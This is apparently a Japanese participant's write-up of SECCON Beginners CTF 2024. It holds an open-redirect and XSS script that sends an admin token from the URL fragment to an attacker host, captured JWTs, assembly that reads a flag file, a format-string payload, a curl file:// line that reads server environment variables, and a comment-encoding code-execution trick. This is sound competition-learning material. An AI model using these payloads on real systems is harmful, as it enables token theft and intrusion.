---
title: SECCON Beginners CTF 2024 参加記
tags:
  - ''
private: false
updated_at: ''
id: null
organization_url_name: null
slide: false
ignorePublish: false
---
# はじめに

SECCON Begginers CTF 2024に参加したので、自分が解いた問題の解法を共有します。

記事書くのは初めてで、乱雑な箇所が多いかもしれませんが、この記事を見てくださった方の学びに少しでも貢献できればと思い書いています。

結果はチーム「Sabiyuku Wabisabi」でScoreは684ptで、117(/962)位でした。

# 解法

## wooorker

### 解法

まず、GETリクエストを入力してその詳細をターミナルに出力するサーバを構築する。
以下、サーバのコードの例

```javascript:server.js
const express = require('express');
const app = express();
const port = 3000;

// JSON形式のリクエストボディをパースするミドルウェア
app.use(express.json());

// すべてのリクエストに対して200ステータスコードを返すミドルウェア
app.use((req, res, next) => {
  console.log(`Received ${req.method} request for ${req.url}`);
  console.log('Headers:', req.headers);
  console.log('Query:', req.query);
  if (req.body) {
    console.log('Body:', req.body);
  }
  res.status(200).send('OK');
});

// サーバを起動
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
```

このコードとpackage.jsonをGitHubのレポジトリに保存します。

その後、[Render](https://render.com/)という無料サーバを用いて、
GitHubのレポジトリを指定して、サーバを立ち上げます。

ngrokやgithubのcodespacesを用いてサーバを立ち上げた場合には、サーバにアクセスする前に確認画面が入るのでうまくいきませんでした。

Render上で立ち上げたサーバのURLを取得します。(以下では`https://example.com/`としています。)

脆弱性報告botに`login?next=https://example.com/`と入力します。その後、Render上のサーバのターミナルの出力を見て、受信したリクエストの内容を確認すると、
```
Received GET request for /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzE4NDUzNzAyLCJleHAiOjE3MTg0NTczMDJ9.LfQhIqEBemmwxSZfSCedaqpKa-SlT9yPOYsyj56M5V8
```
のように表示されているはずです。(このtokenは私が獲得した時のもので、すでに有効期限を過ぎています。)

このtokenを使って`https://wooorker.beginners.seccon.games/?token=******`
にアクセスするとフラグを取得できます。

### フラグ

ctf4b{0p3n_r3d1r3c7_m4k35_70k3n_l34k3d}

## wooorker2

### 解法

woooker1の時に構築したサーバを少し改変します。

前回はクエリパラメータ(`?`以降の部分)にtokenを含んだ状態でリクエストが送られていましたが、今回はフラグメント(`#`以降の部分)にtokenが含まれています。
Render上のサーバが受け取るリクエストにはtokenの情報は含まれていません。リスポンスでJavascriptを含むHTMLを送り、SECCONサーバサイドでJavascriptを実行して、フラグメント部分にあるtokenをRender上のサーバ側に送信する処理を行うように試みます。

サーバのコードは以下のようになります。

Render上のサーバのURLは先ほど同様`https://example.com/`としています。

```javascript:server.js
const express = require('express');
const app = express();
const port = 3000;

app.get('/', (req, res) => {
  const script = `
    <script>
      const fragment = window.location.hash.substring(1);
      const params = new URLSearchParams(fragment);
      const tokenValue = params.get('token');
      fetch('https://example.com/token?value=' + tokenValue)
        .then(() => {
          document.body.innerHTML = '<h1>Token sent to server</h1>';
        })
        .catch((error) => {
          document.body.innerHTML = '<h1>Error sending token to server</h1>';
          console.error('Error:', error);
        });
    </script>
  `;
  res.send(script);
});

app.get('/token', (req, res) => {
  const tokenValue = req.query.value;
  console.log('Received token:', tokenValue);
  res.sendStatus(200);
});

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
```

これによりRender上のサーバで以下のようにtokenが受け取れます。(このtokenは私が獲得した時のもので、すでに有効期限を過ぎています。)
```
Received token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzE4NDcyODI4LCJleHAiOjE3MTg0NzY0Mjh9.yAxwfpt9eU6jJ2E4YofnvRS07FSGSCCRQQB9nmZ161w
```

このtokenを使って`https://wooorker2.beginners.seccon.games/?token=******`
にアクセスするとフラグを取得できます。

### フラグ

ctf4b{x55_50m371m35_m4k35_w0rk3r_vuln3r4bl3}

## assemble

`file.txt`という名前のファイルを開いてその中の文字を出力するアセンブリコードを書くのが基本的な解法の流れになります。

`file.txt`という文字のファイルを開くときに、以下の２点を注意します。

1. リトルエンディアンで格納する必要があるので、txt.elifをutf-8でバイト列に直す必要があります。[バイト列と文字列の変換にはこのサイトが便利です。](https://dencode.com/ja/)

2. 終端文字を表すバイト`\x00`をファイルの名前の終わりに入れる必要があります。

以下が私が作成したアセンブリコードです。rax, rdi, rsi, rdxには適当な数字を入れることでsyscallの処理内容が変えることができます。

また、以下のコードにおけるフラグの長さが52は、色々な数字を二分探索的に入力して見つけました。

```assembly
mov rax, 0x00
push rax
mov rax, 0x7478742e67616c66
push rax
mov rax, 2
mov rdi, rsp
mov rsi, 0
mov rdx, 0
syscall

mov rdi, rax
mov rax, 0
mov rsi, rsp
mov rdx, 52
syscall

mov rax, 1
mov rdi, 1
mov rsi, rsp
mov rdx, 52
syscall
```

### フラグ

ctf4b{gre4t_j0b_y0u_h4ve_m4stered_4ssemb1y_14ngu4ge}

## Welcome

Discord上のannouncementsチャンネルに公開されているフラグを入力するだけです。

# 粘ったが解けなかった問題
## pure and easy
Format String Attackを使って、
exit関数をwin関数に置き換えればいいのかなと思いました。

[この記事を参考にしています。](https://sok1.hatenablog.com/entry/2022/01/17/050556)

以下のような入力を考えましたが、バックスラッシュがうまく読み込めてないのか、それとも入力が間違っているのか、それとも方針自体間違っているのか、わかりませんがうまくいきませんでした...

```
\x40\x40\x40\x00\x41\x40\x40\x00\x42\x40\x40\x00\x43\x40\x40\x00%48c%6$hhn%211c%7$hhn%45c%8$hhn%192c%9$hhn
```

以下この入力の解説をします。
```
objdump -d chall
```
により、
exit関数のアドレス、`0x404040`
win関数の先頭アドレス`0x401341`
を調べます。

win関数の先頭アドレスを分割します。
`0x41=64, 0x13=19, 0x40=64, 0x00=0`のようになります。(競技中はこのように考えていたのですが、原稿執筆時に`0x41=64`が間違えてることに気づきました...ハハハ)

アドレス
`0x00404040`を64, 
`0x00404041`を19, 
`0x00404042`を64,
`0x00404043`を0,
に置き換えようと思い、[この記事](https://sok1.hatenablog.com/entry/2022/01/17/050556)に従って入力を考えました。

# 学び
## wooorker2

1. `url=javascript: alert('XSS')`のように
URLへjavascriptを埋め込むことができる。

2. また、URLのフラグメント(`#`より後の部分)はクライアント側では参照できるが、サーバ側では参照できないという仕様

3. [Render](https://render.com/)を用いて無料で簡単にデプロイできる。

4. ユーザが指定する他のサイトにアクセスするクローラによりtokenが盗まれる危険性があることがわかった。

## ssrforfli
プログラム中でユーザ入力のアドレスにcurlコマンドを行う行為の危険性がわかった。例えば、`curl 'file://localhost/proc/self/environ/'`にアクセスすることでサーバの環境変数が読み込まれることがある。

## pure and easy
```c
puts(buf)
```
上のようなC言語におけるputs関数でそのまま変数を出力する危険性。フォーマット文字列攻撃の対象になる。"%x %x %x %x"のような文字列でスタックを参照される。xをnに変えることでスタックを書き換えられる。

## simple overwrite
変数として確保した領域以上の大きさの値をread関数で読み込むと変数の領域外に書き込めてしまう。

## commentator
pythonにおいて#の後に
```python
# coding:raw_unicode_escape 
#\u000aprint("evil code")
#\u000aprint("\u265F" * 10)
```
のように書くと、コメントの中なのにprint関数を実行できる。

# 感想
どの問題も学びが多く非常に面白かったです。
セキュリティ関連の問題は、謎解きをしている感覚で楽しめるので、ハマってしまいます。

自分が知らないことでもチームメンバーが知っていた場合すぐに解ける箇所もありました(その逆もありました)ので、ある程度時間が経ったらチームメンバーと相談するのが大事な気がしました。
